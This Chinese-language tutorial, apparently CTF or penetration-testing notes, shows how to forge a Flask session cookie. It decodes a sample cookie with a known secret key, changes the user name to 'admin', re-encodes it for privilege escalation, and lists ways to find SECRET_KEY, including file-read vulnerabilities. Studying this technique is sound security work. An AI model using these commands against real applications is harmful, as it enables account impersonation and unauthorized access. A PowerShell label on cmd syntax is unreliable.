# session伪造

## 前提

要伪造 Flask Session Cookie，必须先获取到应用程序配置文件中的 `**SECRET_KEY**`。

### 1. 解码 Session Cookie

使用 `flask_session_cookie_manager3.py` 工具对已有的 Session Cookie 进行解码，以查看其内容。

`python3 flask_session_cookie_manager3.py decode -s -c `

* `**-s**`：指定 Flask 应用的 `SECRET_KEY`。
* `**-c**`：指定要解码的 Session Cookie 值。

**示例：**

`python3 flask_session_cookie_manager3.py decode -s ckj123 -c ".eJxF0M2KwjAUhuFbGbJ2Udu6EVx0SA1TyAkZ0oacjWit1vw4UJUxFe99igMz6xeew3ceZHMYuktPltfh1s3I5rQnywd525ElEQw9T-UdqbdC8dHoymGQCdg2Q1pnqMqEs7XFAD3QOhcMrLE8oi6joEUqtEyM9T2qj1yod8upuUMoR27bHGmbQcrvnO490sqj5olQvQPd9Ny63KQ8mjD5qcxAywWGZnLMApjJzHjMUfEMdR3R4onbekWeM9JehsPm-uW68_8EtZ_OFikfmx5Y_Q2qSI2GALbMwBZRsMoCq7wJnw6UnLqbG7l6caewPXZ_UrOu4-74W87bAXiou_IjNwu3fB6G5kn5PkD6nJrqw.aK70Iw.Jy4aoxAlksSRiL32tne2uJjW2H0"`

**解码结果：**

`{'_fresh': True, '_id': b'...', 'csrf_token': b'97c00635...', 'image': b'TU2n', 'name': 'kyle', 'user_id': '10'}`

### 2. 修改并编码 Session Cookie

解码后，可以修改字典中的任意值。例如，将 `name` 从 `'kyle'` 修改为 `'admin'`，然后重新编码生成新的 Session Cookie。

**注意：** 重新编码时，你需要提供完整的 Python 字典字符串。

`python3 flask_session_cookie_manager3.py encode -s -t `

* `**-s**`：指定 Flask 应用的 `SECRET_KEY`。
* `**-t**`：指定包含修改内容的 Python 字典字符串。

**示例：**

`python3 flask_session_cookie_manager3.py encode -s ckj123 -t "{'_fresh': True, '_id': b'8fe3d1d9c933abdfd4677d57e140acfca4588ccb32ea28069d4b9ae2890c0616a3278d777c107ed2eec498d5ea298cc2ba43d75d9feae694f7c88e37ee2f6b25', 'csrf_token': b'97c00635a4e0506acf6176028bc4bebdd540595a', 'image': b'TU2n', 'name': 'admin', 'user_id': '10'}"`

执行后，工具会输出新的 Session Cookie。将这个新值替换浏览器中的旧 Cookie，即可伪造身份并实现权限提升。

### 4. SECRET\_KEY 怎么找

#### 查看源代码

最直接的方法是查看项目的源代码。`SECRET_KEY` 通常定义在以下文件中：

* `**config.py**`：这是 Flask 项目中用来存放配置信息的最常见文件。
* `**app.py**`\*\* 或 \*\*`**__init__.py**`：在小型应用中，密钥可能会直接定义在主应用文件里。
* `**.env**`\*\* 文件\*\*：为了安全起见，开发者可能会将密钥作为环境变量存放在 `.env` 文件中，然后在代码中读取。

你可以在这些文件中搜索 `SECRET_KEY`、`SECRET_KEY`、`SECRET_KEY` 等关键字。

#### 查看环境变量

如果密钥不在代码文件中，那么很可能它被设置为环境变量。你可以通过以下方式检查：

**Linux/macOS：**

* Bash

```plain
echo $SECRET_KEY
```

**Windows：**

* PowerShell

```plain
echo %SECRET_KEY%
```

#### 网站漏洞利用（如文件泄露）

如果以上方法都行不通，你可能需要寻找网站本身存在的漏洞。常见的漏洞，如**文件包含（LFI）**、**任意文件读取**或**代码泄露**，都可能帮助你获取服务器上的配置文件，进而找到 `SECRET_KEY`。

总之，找到 `SECRET_KEY` 的位置，就找到了伪造 Flask Session Cookie 的关键。在实际的渗透测试中，这通常需要结合多种信息收集和漏洞利用技术。
